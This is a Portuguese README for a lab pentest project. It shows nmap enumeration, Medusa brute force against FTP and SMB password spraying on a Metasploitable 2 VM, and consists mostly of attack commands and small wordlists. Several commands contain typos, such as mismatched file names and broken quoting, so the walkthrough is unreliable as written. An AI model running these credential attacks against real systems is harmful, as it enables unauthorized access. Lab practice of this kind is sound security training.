# Projeto de pentest simulando ataques de brute force usando Parrot OS e Medusa.
## 📌 Descrição
Este projeto teve como objetivo realizar uma auditoria de segurança ofensiva em ambiente controlado, utilizando Parrot OS como máquina atacante e Metasploitable 2 como alvo vulnerável. Foram simulados ataques de força bruta com o uso da ferramenta Medusa.
___
## 🔧 Ferramentas
* Parrot OS (Maquina atacante)
* Metasploitable 2 (Maquina alvo, IP: 192.168.100.222)
* Nmap
* Medusa
___
## 📎Etapa 1 Enumeração de serviços com Nmap 
* Acesso Root: ``` sudo su ```
* Codigo: ``` nmap -sV -p 21, 22, 80, 445, 139 192.168.100.222 ```
* Teste porta: ``` ftp 192.168.100.222 ```
___
## 📎Etapa 2 Criação de wordlists
* Lista de usuarios: ``` echo -e "user\nmsfadmin\root" > users.txt ```
* Lista de senhas: ``` echo -e "123456\nmsfadmin\npassword\nqwert" > pass.txt ```
___
## 📎Etapa 3 Ataque de Brute Force ao protocolo FTP usando Medusa
* Codigo: ``` medusa -h 192.168.100.222 -U user.txt -P pass.txt -M ftp -t 6 ```
___
## 📎Password Spraying
* Enumeração de usuarios: ``` enum4linux -a 192.168.100.222 | tee enum4_output.txt ```
* Mostar o arquivo no terminal: ``` less enum4_output.txt ```
* Criar listas (Usuarios): ``` echo -e "user\nmsfadmin\nservice\nroot\" > smb_users.txt ```
* Criar listas (Senhas): ``` echo -e "user\nmsfadmin\npassword\n123456\nWelcome123" > pass_spray.txt ```
* Password Spraying com Medusa: ``` medusa -h 192.168.100.222 -U smb_usaers.txt -P pass_spray.txt -M smbnt -t2 -T50 ```
* Teste de acesso: ``` smbclient -L // 192.168.100.222 -U msfadmin ```

